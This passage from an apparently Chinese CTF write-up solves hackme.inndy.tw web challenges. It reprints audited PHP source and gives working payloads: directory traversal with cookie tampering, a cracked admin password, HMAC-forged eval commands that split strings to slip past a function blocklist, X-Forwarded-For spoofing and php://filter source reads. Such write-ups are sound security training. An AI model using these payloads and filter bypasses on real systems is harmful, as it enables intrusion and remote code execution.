<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">find_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $cnt = count($GLOBALS[<span class="string">"users"</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($user == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass == <span class="keyword">NULL</span> || ($pass == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">1</span>] &amp;&amp; $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">7</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">"users"</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"guest"</span>, <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, <span class="string">"./data/guest"</span>, <span class="string">"https://game1.security.ntu.st/data/guest"</span>, <span class="number">0</span>, <span class="string">"^.ht"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数</p>
<p>在fun_down.php文件中可以找到一个readfile()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> (<span class="string">'core/secure.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    $item = basename($item);</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $browser = id_browser();</span><br><span class="line">    header(<span class="string">'Content-Type: '</span> . (($browser == <span class="string">'IE'</span> || $browser == <span class="string">'OPERA'</span>) ? <span class="string">'application/octetstream'</span> : <span class="string">'application/octet-stream'</span>));</span><br><span class="line">    header(<span class="string">'Expires: '</span> . gmdate(<span class="string">'D, d M Y H:i:s'</span>) . <span class="string">' GMT'</span>);</span><br><span class="line">    header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($abs_item));</span><br><span class="line">    <span class="keyword">if</span> ($browser == <span class="string">'IE'</span>) &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: no-cache, must-revalidate'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: no-cache'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @readfile($abs_item);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目过滤部分如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure>
<p>我们要读取的是 <code>.config/.htusers.php</code> ，但是在题目的 <code>stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;)</code> 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_file</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $fname = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>]) &amp;&amp; $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        $item = basename(stripslashes($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"fname"</span>]));</span><br><span class="line">        $fname2 = get_abs_item($dir, $item);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($item) || $item == <span class="string">""</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnoname"</span>]);</span><br><span class="line">        <span class="keyword">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"itemdoesexist"</span>]);</span><br><span class="line">        savefile($dir, $fname2);</span><br><span class="line">        $fname = $fname2;</span><br><span class="line">    &#125;</span><br><span class="line">    $fp = @fopen($fname, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($fp === <span class="keyword">false</span>) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"openfile"</span>]);</span><br><span class="line">    $s_item = get_rel_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (strlen($s_item) &gt; <span class="number">50</span>) $s_item = <span class="string">"..."</span> . substr($s_item, <span class="number">-47</span>);</span><br><span class="line">    show_header($GLOBALS[<span class="string">"messages"</span>][<span class="string">"actedit"</span>] . <span class="string">": /"</span> . $s_item);</span><br></pre></td></tr></table></figure>
<p>函数中有三条过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure>
<p>第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_show_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">'help'</span>] == <span class="string">'me'</span>) &#123;</span><br><span class="line">        $_COOKIE[<span class="string">'help'</span>] = <span class="keyword">null</span>;</span><br><span class="line">        setcookie(<span class="string">'help'</span>, <span class="string">''</span>, time() - <span class="number">9999999999</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Very good. You know how to create cookie. How about tamper a cookie?")&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">'show_hidden'</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">'show_hidden'</span>, <span class="string">'no'</span>, time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (substr($item, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span> &amp;&amp; $GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span> &amp;&amp; $_COOKIE[<span class="string">'show_hidden'</span>] != <span class="string">'yes'</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"no_access"</span>] != <span class="string">""</span> &amp;&amp; @eregi($GLOBALS[<span class="string">"no_access"</span>], $item)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">        <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目仅仅对$item进行了简单的过滤， <code>if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false;</code> ，那么我们可以考虑用目录穿越 <code>../../</code> 绕过</p>
<p>那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes）</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>dafuq-manager.hackme.inndy.tw<span class="regexp">/index.php?action=edit&amp;item=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>var<span class="regexp">/www/</span>webhdisk<span class="regexp">/.config/</span>.htusers.php&amp;order=name&amp;srt=yes&amp;lang=en</span><br></pre></td></tr></table></figure>
<p>于是可以读到目标文件</p>
<p><img src="hackme/3.png" alt=".htusers.php"></p>
<p>然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 <code>how do you turn this on</code> ，登录即可读取flag</p>
<h1 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a>dafuq-manager 3</h1><p>题目给出了信息</p>
<blockquote>
<p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p>
</blockquote>
<p>这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 <code>eval</code> ，在fun_debug.php中发现存在该函数，跟进一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以我们可以自己生成command</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3"</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(make_command(<span class="string">'$a=\'sys\';$b=\'tem\';$c=$a.$b;$c(base64_decode(\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\'));'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&amp;dir</span>[<span class="string"></span>]=admin&amp;command=JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order=name&amp;srt=yes&amp;lang=en</span><br></pre></td></tr></table></figure>
<p>做完后感觉自己好菜呀，这代码审计的我晕头转向，233333…</p>
<h1 id="wordpress-1"><a href="#wordpress-1" class="headerlink" title="wordpress 1"></a>wordpress 1</h1><p>WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 <code>wp-content/plugins/core.php</code> 中发现了一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_f14g</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$h = <span class="string">'m'</span>.sprintf(<span class="string">'%s%d'</span>,<span class="string">'d'</span>,<span class="number">-4</span>+<span class="number">9e0</span>);</span><br><span class="line">	<span class="keyword">if</span>($h($_GET[<span class="string">'passw0rd'</span>]) === <span class="string">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(wp_get_user_ip() === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">			<span class="keyword">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class="string">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_SALT)));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们把代码中的md5解密一下发现是 <code>cat flag</code>，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="variable">s:</span>//<span class="keyword">wp</span>.hackme.inndy.tw/?passw0rd=<span class="keyword">cat</span>%<span class="number">20</span>flag</span><br></pre></td></tr></table></figure>
<p>查看元素即可找到flag</p>
<h1 id="wordpress-2"><a href="#wordpress-2" class="headerlink" title="wordpress 2"></a>wordpress 2</h1><p>随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- debug:<span class="meta">&lt;?php</span> var_dump($wp_query-&gt;post-&gt;&#123;<span class="string">'post_'</span>.(string)($_GET[<span class="string">'debug'</span>]?:<span class="string">'type'</span>)&#125;); <span class="meta">?&gt;</span> --&gt;</span><br></pre></td></tr></table></figure>
<p>看到query，应该是在搜索页面，所以我们提交的payload应该为</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>wp.hackme.inndy.tw<span class="regexp">/archives/</span>date<span class="regexp">/2013/</span><span class="number">10</span>?s=&amp;debug=content</span><br></pre></td></tr></table></figure>
<h1 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a>command-executor</h1><p>随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="variable">s:</span>//<span class="keyword">command</span>-executor.hackme.inndy.tw/<span class="built_in">index</span>.php?func=php://<span class="built_in">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=<span class="built_in">index</span></span><br></pre></td></tr></table></figure>
<p>base64解码一下得到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">'man'</span>, <span class="string">'Man'</span>],</span><br><span class="line">    [<span class="string">'untar'</span>, <span class="string">'Tar Tester'</span>],</span><br><span class="line">    [<span class="string">'cmd'</span>, <span class="string">'Cmd Exec'</span>],</span><br><span class="line">    [<span class="string">'ls'</span>, <span class="string">'List files'</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cmd, $shell=<span class="string">'bash'</span>)</span> </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'func'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">'..'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) 